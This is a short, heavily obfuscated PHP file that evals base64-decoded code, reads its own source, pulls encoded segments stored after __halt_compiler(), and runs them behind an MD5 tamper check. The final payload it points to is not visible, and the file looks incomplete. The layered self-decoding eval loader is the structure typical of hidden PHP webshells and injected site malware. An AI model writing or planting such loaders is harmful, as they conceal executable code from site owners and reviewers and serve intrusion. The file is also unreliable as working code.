<?php $CqQqTwM=file(__FILE__);eval(base64_decode("ZnVuY3Rpb24ga3JCYmx4cigkYSwkYil7JGM9YXJyYXkoNDk2LDE0MCwzMik7aWYoJGI9PTYyKXskZD1zdWJzdHIoJGEsJGNbMF0rJGNbMV0sJGNbMl0pO31lbHNlaWYoJGI9PTEyKXskZD1zdWJzdHIoJGEsJGNbMF0sJGNbMV0pO31lbHNlaWYoJGI9OTIpeyRkPXRyaW0oc3Vic3RyKCRhLCRjWzBdKyRjWzFdKyRjWzJdKSk7fXJldHVybiRkO30="));eval(base64_decode(krBblxr($CqQqTwM[0], 12)));eval(" ?>" . yDwSVWv(krBblxr($CqQqTwM[0], 92), krBblxr($CqQqTwM[0], 62)));__halt_compiler();a3hFUEFrcmR6WFRMdUZEdFlqaEJBSXB5bVRab0RRVmw=ZnVuY3Rpb24geUR3U1ZXdigkYSwkYil7aWYoJGI9PW1kNSgkYSkpe3JldHVybiBiYXNlNjRfZGVjb2RlKCRhKTt9ZWxzZXtlY2hvKCJUaGUgZmlsZSB3YXMgbW9kaWZpZWQiKTt9fQ==